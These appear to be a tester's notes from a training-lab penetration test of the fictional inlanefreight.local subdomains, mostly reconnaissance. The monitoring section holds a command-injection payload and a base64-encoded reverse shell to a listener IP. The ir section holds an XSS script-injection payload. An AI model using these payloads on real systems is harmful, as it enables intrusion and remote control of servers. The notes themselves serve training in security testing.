# `inlanefreight.local`
## Team Members
- some names (POTENTIAL usernames)
- http://inlanefreight.local/about.html
![[Pasted image 20240815140549.png]]
## Form
- get in touch form (can be tested for XSS BLIND/STORE)
![[Pasted image 20240815141004.png]]
## Subscribe modal

![[Pasted image 20240815141405.png]]
![[Pasted image 20240815141415.png]]
## Directory search
## /monitoring
- `/monitoring` has been found, with login form
![[Pasted image 20240815170253.png]]
## Vhost discovery
- `monitorint.inlanefreight.local` has been found

# `monitoring.inlanefreight.local`
-  except `index.php` and `login.php`, `ping.php` has been found, potential comand injection
- fuzzing variables requried
- after fuzzing parameters `ip` has been found
- this payload exploited command injection  
```
/ping.php?ip=127.0.0.1%0acat${IFS}login.php
```
-  after login into I have webshell in restricted shell
- to recieve rev shell the next payload will be good but it works only for 10.10.15.188:4444 listener. 
	- to create for new ip/port, base64 should containt `+`
```
/ping.php?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<YmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjE4OC80NDQ0ICAwPiYx)
```


# `blog.inlanefreight.local`
- Drupal
![[Pasted image 20240816070501.png]]
- with login page under `/under/login`, create new account with file upload and reset your password also exists
![[Pasted image 20240816070528.png]]
- after username creation it says that `accounts is currently pending approval by the site administrator`
	- Maybe it make sense to test for **`BLIND SQL`**
![[Pasted image 20240816074205.png]]
- also there is `/contact` page with website feedback, **has to be tested for  BLIND XSS**
	- it's really sends POST request
![[Pasted image 20240816074402.png]]
![[Pasted image 20240816074533.png]]
![[Pasted image 20240816074550.png]]
- don't  know why but I noticed requests somethi like `/wp-content/themes/...` and `/wp-content/plugins/...`. I think it is some drupal plugin for integration with Wordpress. But maybe it not sufficiont, all of them 404
## `robots.txt`
- ohh, there are many interesting her ;)
- I've checked everything here and nothing seems to be interesting all of them either
	- access denided
	- 401
	- Page not found
```
User-agent: *
# CSS, JS, Images
Allow: /core/*.css$
Allow: /core/*.css?
Allow: /core/*.js$
Allow: /core/*.js?
Allow: /core/*.gif
Allow: /core/*.jpg
Allow: /core/*.jpeg
Allow: /core/*.png
Allow: /core/*.svg
Allow: /profiles/*.css$
Allow: /profiles/*.css?
Allow: /profiles/*.js$
Allow: /profiles/*.js?
Allow: /profiles/*.gif
Allow: /profiles/*.jpg
Allow: /profiles/*.jpeg
Allow: /profiles/*.png
Allow: /profiles/*.svg
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.txt
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /index.php/admin/
Disallow: /index.php/comment/reply/
Disallow: /index.php/filter/tips
Disallow: /index.php/node/add/
Disallow: /index.php/search/
Disallow: /index.php/user/password
Disallow: /index.php/user/register
Disallow: /index.php/user/login
Disallow: /index.php/user/logout
```
## Scanner
- droopscan, from here possible version is 9.0.2
![[Pasted image 20240816072524.png]]
## Possible exploits for 9.0.2
- [CVE-2020-13671](https://www.rapid7.com/db/vulnerabilities/drupal-cve-2020-13671/) - Drupal core does not properly sanitize certain filenames on uploaded files, which can lead to files being interpreted as the incorrect extension and served as the wrong MIME type or executed as PHP for certain hosting configurations. This issue affects: Drupal Drupal Core 9.0 versions prior to 9.0.8, 8.9 versions prior to 8.9.9, 8.8 versions prior to 8.8.11, and 7 versions prior to 7.74.
	- https://nvd.nist.gov/vuln/detail/CVE-2020-13671
	- https://github.com/advisories/GHSA-68jc-v27h-vhmw
	- Unfortunately I didn't find any POCs in the internet
- I WAS TRYING TO EXPLOIT IT BUT FAILED, AT LEAST IN FIRST TIME
	- it accepts `shell.php.gif` but change name to `shell.php_.gif` I failed bypassing it

# `support.inlanefreight.local`
- ticket creation functionality under `/ticket.php`
![[Pasted image 20240816083537.png]]
- all other links except `/login.php` are 404
- `/login.php` shows admin login form
![[Pasted image 20240816083752.png]]
## ticket feature
- message after successful ticket send
![[Pasted image 20240816090715.png]]
- it happens via GET request for some reason and with the next parameters
![[Pasted image 20240816090809.png]]
## dirsearch
- common.txt with extension `txt,xml,php,html`
- nothing so interesting for now except login.php and ticket.php
![[Pasted image 20240816090302.png]]
# `status.inlanefreight.local`
- It seems that it is only one thing that exists on this domain
	- some sort of search of envents that happens somewhere else
![[Pasted image 20240816090130.png]]
## directory search
- `common.txt` with  `php,txt,html`  extensions
![[Pasted image 20240816090219.png]]
# `careers.inlanefreight.local`
- **Designed by HTML Codex** but it seems that I can't find any versions and this is just template builder of html, so not sure that I can exploit it
	- But as this is just a template build I must test for **XSS**es
- One more login `/login`
![[Pasted image 20240816091207.png]]
- at least `/register` exists
	- I managed to register via test:test:test :)
![[Pasted image 20240816091237.png]]
- after registration I got and ID 9 `http://careers.inlanefreight.local/profile?id=9` possible IDOR, and header `# Jobs applied by test`
![[Pasted image 20240816091411.png]]
- also on `/apply` page there is form for job apply with possibility of file upload
	- **BUT IF TRY IT then it doesn't sent anything to the networks**
![[Pasted image 20240816092538.png]]
- HEAD request returns 200 even if with GET requests it returns 403, OPTION is 405
## dirsearch
- nothing else, what I have seen dirsearch didn't find
![[Pasted image 20240816095856.png]]

# `tracking.inlanefreight.local`
- Has name ILF Shipment tracking, `http://status.inlanefreight.local/` also has ILF in the title so I think they are connected!
- Names for clients, maybe can be used as usernames
![[Pasted image 20240816093814.png]]
- contact us that does not send anything
- for some reason I have redirection on `free-template.co`
- If try to search for track it always returns pdf
![[Pasted image 20240816094348.png]]
![[Pasted image 20240816094321.png]]
- on PDF represented what was in search here is `88888888`
## dirsearch
- nothing so interesting
![[Pasted image 20240816103402.png]]

# `ir.inlanefreight.local`
- so this is definitely wordpress with login page
![[Pasted image 20240816100516.png]]
- `robots.txt`
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://ir.inlanefreight.local/wp-sitemap.xml
```
- `sitemap.xml` also exists but it is not so useful
- there is form to leave comment under `2022/05/30/hello-world/` it seems that it works, but for some reason it is not showing on the page.
	- I must test for XSS
![[Pasted image 20240816105651.png]]
- `"><script src="http://10.10.15.250"></script>` in website
![[Pasted image 20240820171600.png]]
## wpscan results
- wordpress version 6.0
- discovered users via  Author Id Brute Forcing - Author Pattern
```
ilfreightwp -> author sitemap
tom
james
john
```
- plugins discovered
```
akismet -> 403
b2i-investor-tools -> The version is out of date, the latest version is 1.0.7.7
feed -> version cannot be determined
mail-masta -> version 1.0 up to date
```
- themes
```
cbusiness-investment -> version is not determined
twentytwenty -> version is not determined
twentytwentyone - version is not determined
twentytwentytwo - The version could not be determined
```
# `gitlab.inlanefreight.local`
- GITLAB instance
- Possibility for user registration, created user with `rohaki@gmail.com:testtest` creds
- there are two internal projects
![[Pasted image 20240816110528.png]]
### shopdev2.inlanefreight.local
- second repository has name `shopdev2.inlanefreight.local` and indeed we have server on this domain after I added to hosts
- it has one initial commit
- empty `application.properties`
- also have very simple java classes
- there are no creds through all files
- only jar file an contain something interesting but I don't want download it
- the code which on `shopdev2.inlanefreight.local` is definitely not which is on domain...
- user that did commit has email `jlenny@gitlab.com`
# `shopdev2.inlanefreight.local`
- it has been found because of gitlab repo
![[Pasted image 20240816111100.png]]
- default creds `admin:admin` works
- there is `Contact Us`  page
	- but it doesn't send anything
![[Pasted image 20240816113115.png]]
- and `My Cart` page
![[Pasted image 20240816113330.png]]
- after cleacking on `I Agree` and `Complete purchase` request `checkout.php` get's send, with XML payload!!!!
![[Pasted image 20240816113533.png]]
# `dev.inlanefreight.local`
- from beginning login page
![[Pasted image 20240816115513.png]]
## dirbuster
- under `/flag.txt` flag has been found!!!
- it also found `/upload.php` and `/uploads`
![[Pasted image 20240816120154.png]]
- well unfortunately `/upload.php` return 200 but with content `403 Forbidden`, it seems that I need log in to use it
![[Pasted image 20240816120432.png]]
# `vpn.inlanefreight.local`
- from start login page
![[Pasted image 20240816115549.png]]
## dirsearch
- nothing interesting from `common`
![[Pasted image 20240816120652.png]]